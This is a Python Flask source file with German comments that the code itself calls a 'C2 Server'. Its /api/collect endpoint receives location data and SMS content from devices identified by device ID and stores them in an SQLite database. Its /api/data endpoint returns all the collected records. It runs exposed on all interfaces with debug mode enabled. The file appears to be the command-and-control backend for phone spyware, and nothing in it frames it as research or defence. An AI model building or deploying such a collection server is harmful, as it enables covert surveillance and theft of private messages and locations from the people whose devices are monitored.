from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
from datetime import datetime
import json

app = Flask(__name__)
CORS(app)  # Erlaubt Cross-Origin Requests

def init_db():
    """Initialisiert die SQLite Datenbank"""
    conn = sqlite3.connect('c2_data.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT NOT NULL,
                  device_id TEXT NOT NULL,
                  data_type TEXT NOT NULL,
                  data_value TEXT NOT NULL)''')
    conn.commit()
    conn.close()
    print("Datenbank initialisiert")

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """Empfängt Daten von den Geräten"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"status": "error", "message": "Keine Daten erhalten"}), 400
        
        device_id = data.get('device_id', 'unknown')
        timestamp = datetime.now().isoformat()
        
        # Verbindung zur Datenbank
        conn = sqlite3.connect('c2_data.db', check_same_thread=False)
        c = conn.cursor()
        
        # Speichere verschiedene Datentypen
        if 'location' in data:
            c.execute('''INSERT INTO data (timestamp, device_id, data_type, data_value)
                         VALUES (?, ?, ?, ?)''',
                      (timestamp, device_id, 'location', data['location']))
        
        if 'sms' in data:
            c.execute('''INSERT INTO data (timestamp, device_id, data_type, data_value)
                         VALUES (?, ?, ?, ?)''',
                      (timestamp, device_id, 'sms', data['sms']))
        
        conn.commit()
        conn.close()
        
        print(f"Daten empfangen von {device_id}: {data}")
        return jsonify({"status": "success", "message": "Daten gespeichert"}), 200
        
    except Exception as e:
        print(f"Fehler: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/data', methods=['GET'])
def get_data():
    """Gibt gespeicherte Daten zurück"""
    try:
        data_type = request.args.get('type')
        
        conn = sqlite3.connect('c2_data.db', check_same_thread=False)
        c = conn.cursor()
        
        if data_type:
            c.execute('''SELECT * FROM data WHERE data_type = ? ORDER BY timestamp DESC''', 
                     (data_type,))
        else:
            c.execute('''SELECT * FROM data ORDER BY timestamp DESC''')
        
        rows = c.fetchall()
        conn.close()
        
        # Konvertiere zu JSON
        data_list = []
        for row in rows:
            data_list.append({
                'id': row[0],
                'timestamp': row[1],
                'device_id': row[2],
                'data_type': row[3],
                'data_value': row[4]
            })
        
        return jsonify({
            "status": "success",
            "data": data_list
        }), 200
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health Check Endpoint"""
    return jsonify({"status": "healthy", "message": "Server läuft"}), 200

if __name__ == '__main__':
    init_db()
    print("C2 Server startet auf http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)